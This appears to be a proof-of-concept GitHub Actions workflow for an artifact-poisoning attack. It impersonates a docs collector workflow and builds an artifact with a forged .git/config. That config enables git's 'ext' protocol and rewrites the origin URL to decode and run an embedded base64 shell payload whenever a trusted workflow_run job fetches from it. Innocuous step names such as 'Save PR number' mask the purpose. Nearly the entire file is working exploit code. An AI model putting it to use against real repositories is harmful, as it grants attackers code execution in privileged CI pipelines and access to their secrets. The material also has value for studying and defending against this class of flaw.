name: Docs PR AI menu (collect)

# PoC: same workflow name as the upstream collector. For pull_request events from a
# fork GitHub executes the workflow version from the pull request, so this job is
# attacker-controlled while the artifact it uploads feeds the trusted workflow_run job.

on:
  pull_request:
    types: [opened, reopened, synchronize, ready_for_review]

permissions:
  contents: read

jobs:
  collect:
    name: Save PR number
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout
        uses: actions/checkout@v7.0.1

      - name: Build artifact with attacker .git
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          set -euo pipefail
          rm -rf art evil
          mkdir -p art evil
          cd evil
          git init -q -b main .
          git -c user.email=poc@example.com -c user.name=poc commit -q --allow-empty -m 'attacker commit'
          cd ..
          cp -r evil/.git art/.git
          printf '%s\n' "$PR_NUMBER" > art/pr_number.txt

      - name: Embed payload
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          set -euo pipefail
          sed "s/__PR_NUMBER__/${PR_NUMBER}/g" poc/pwn.sh > /tmp/pwn.sh
          python3 - <<'PY'
          import base64, pathlib
          script = pathlib.Path('/tmp/pwn.sh').read_bytes()
          b64 = base64.b64encode(script).decode()
          url = 'https://github.com/PDFtoMark/triage-elastic-v759d5e8-945dd0'
          cfg = (
              '[core]\n'
              '\trepositoryformatversion = 0\n'
              '\tfilemode = true\n'
              '\tbare = false\n'
              '\tlogallrefupdates = true\n'
              '[protocol "ext"]\n'
              '\tallow = always\n'
              '[remote "origin"]\n'
              '\turl = ' + url + '\n'
              '\tfetch = +refs/heads/*:refs/remotes/origin/*\n'
              '[url "ext::sh -c echo% ' + b64 + '|base64% -d|sh"]\n'
              '\tinsteadOf = ' + url + '\n'
          )
          pathlib.Path('art/.git/config').write_text(cfg)
          PY

      - name: Upload PR number
        uses: actions/upload-artifact@v7
        with:
          name: pr-number
          path: art
          include-hidden-files: true
          retention-days: 1
